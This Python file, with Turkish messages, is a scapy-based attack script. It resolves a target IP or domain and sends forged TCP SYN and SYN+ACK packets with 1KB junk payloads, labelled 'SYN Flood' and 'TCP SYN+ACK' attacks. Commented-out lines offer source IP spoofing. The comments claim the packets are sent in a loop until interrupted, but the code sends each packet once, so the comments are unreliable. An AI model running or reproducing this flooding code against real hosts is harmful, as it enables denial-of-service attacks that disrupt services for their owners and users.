from scapy.all import *
import socket
import ipaddress

target_ip = ""
target_port = 0
input_ip=""

def triggerAttack(attackName, input_ipOrDns, input_port):
    global input_ip
    input_ip=""
    if input_ipOrDns.startswith("http") or input_ipOrDns.endswith("/"):
        # eğer http ile başlıyorsa http veya https'yi temizle
        input_ipOrDns = input_ipOrDns.replace(
            "http://", "").replace("https://", "").replace("/", "")
        if input_ipOrDns.startswith("www"):
            input_ip = dns_to_ip(input_ipOrDns)
        else:
            print("DNS çözümleme başarısız! Girmiş olduğunuz DNS adresinin doğruluğunu kontrol edin.")
    elif input_ipOrDns.startswith("www"):
        input_ip = dns_to_ip(input_ipOrDns)
    else:  
        if is_valid_ip_address(input_ipOrDns):
            input_ip=input_ipOrDns
        else:
            print("Geçersiz IP veya DNS adresi!")

    if attackName == "TCP SYN+ACK":
        tcpSynAck(input_ip, input_port)
    elif attackName == "SYN Flood":
        if input_ip =="":
            print("SYN Flood saldırısı yapılamadı!")
        else:
            synFlood(input_ip, input_port)
        
    else:
        print(attackName)


def dns_to_ip(domain_name):
    try:
        ip_address = socket.gethostbyname(domain_name)
        print(f"{domain_name} DNS'i, IP adresi: {ip_address}")
        return ip_address
    except socket.error as e:
        print(f"DNS çözme hatası: {e}")

def is_valid_ip_address(ip_address):
    try:
        ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        return False



def tcpSynAck(ip, port):
    global target_ip
    global target_port
    print("TcpSynAck yapılıyor.")

    try:
        # target IP address (should be a testing router/firewall)
        target_ip = ip
        # the target port u want to flood
        target_port = port
        # forge IP packet with target ip as the destination IP address
        ip = IP(dst=target_ip)
        # or if you want to perform IP Spoofing (will work as well)
        # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
        # forge a TCP SYN packet with a random source port
        # and the target port as the destination port
        tcp = TCP(sport=RandShort(), dport=target_port, flags="SA")
        # add some flooding data (1KB in this case)
        raw = Raw(b"X"*1024)
        # stack up the layers
        p = ip / tcp / raw
        # send the constructed packet in a loop until CTRL+C is detected
        print("yollanıyor")
        send(p,verbose=0)
    except Exception as e:
        print("tcpSynAck saldırısı yapılamadı!")
        print(str(e))



def synFlood(ip, port):
    global target_ip
    global target_port
    try:
        # target IP address (should be a testing router/firewall)
        target_ip = ip
        # the target port u want to flood
        target_port = port
        # forge IP packet with target ip as the destination IP address
        ip = IP(dst=target_ip)
        # or if you want to perform IP Spoofing (will work as well)
        # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
        # forge a TCP SYN packet with a random source port
        # and the target port as the destination port
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        # add some flooding data (1KB in this case)
        raw = Raw(b"X"*1024)
        # stack up the layers
        p = ip / tcp / raw
        # send the constructed packet in a loop until CTRL+C is detected
        print("yollanıyor")
        send(p,verbose=0)
    except Exception as e:
        print("SynFlood saldırısı yapılamadı!")
        print(str(e))



